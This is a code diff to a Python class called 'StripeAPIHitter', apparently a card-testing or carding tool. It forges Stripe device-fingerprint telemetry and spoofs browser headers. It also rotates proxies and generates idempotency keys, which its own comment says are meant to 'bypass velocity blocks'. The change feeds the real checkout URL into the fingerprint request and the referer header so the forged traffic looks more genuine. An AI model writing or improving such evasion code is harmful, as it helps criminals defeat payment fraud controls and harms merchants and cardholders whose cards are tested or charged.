@@ -756,7 +756,7 @@ class StripeAPIHitter:
         self.raw_amount = raw_amount
         self.locked_email = locked_email
 
-    async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict) -> Dict[str, str]:
+    async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None) -> Dict[str, str]:
         """Generate Stripe device fingerprint tokens via m.stripe.com/6"""
         import uuid as _uuid
         fallback = {'muid': str(_uuid.uuid4()), 'sid': str(_uuid.uuid4()), 'guid': str(_uuid.uuid4())}
@@ -775,7 +775,13 @@ class StripeAPIHitter:
 
             is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
             is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith('seti_')
-            landing_url = f"https://invoice.stripe.com/i/...#cs_{self.cs_live}" if (is_pi or is_seti) else f"https://checkout.stripe.com/c/pay/{self.cs_live}"
+            # Use the real session page URL if provided, else build a best-guess
+            if page_url:
+                landing_url = page_url
+            elif is_pi or is_seti:
+                landing_url = f"https://invoice.stripe.com/i/{self.cs_live}"
+            else:
+                landing_url = f"https://checkout.stripe.com/c/pay/{self.cs_live}"
 
             payload = {
                 "v": 2,
@@ -925,7 +931,7 @@ class StripeAPIHitter:
                     "accept": "application/json",
                     "content-type": "application/x-www-form-urlencoded",
                     "origin": origin_url,
-                    "referer": f"{origin_url}/",
+                    "referer": checkout_page_url,
                     "user-agent": profile["user_agent"]
                 }
                 if "sec-ch-ua" in profile: headers["sec-ch-ua"] = profile["sec-ch-ua"]
@@ -939,7 +945,8 @@ class StripeAPIHitter:
                     ProxyManager._geo_cache[proxy_data.get('server', '')] = address['country']
                 
                 # Stripe device fingerprint tokens (muid/sid/guid)
-                stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address)
+                # Pass the real checkout page URL so m.stripe.com/6 gets an honest 'b' referrer field
+                stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address, page_url=checkout_page_url)
     
                 # Generate perfectly formatted Idempotency Keys to bypass velocity blocks
                 import uuid
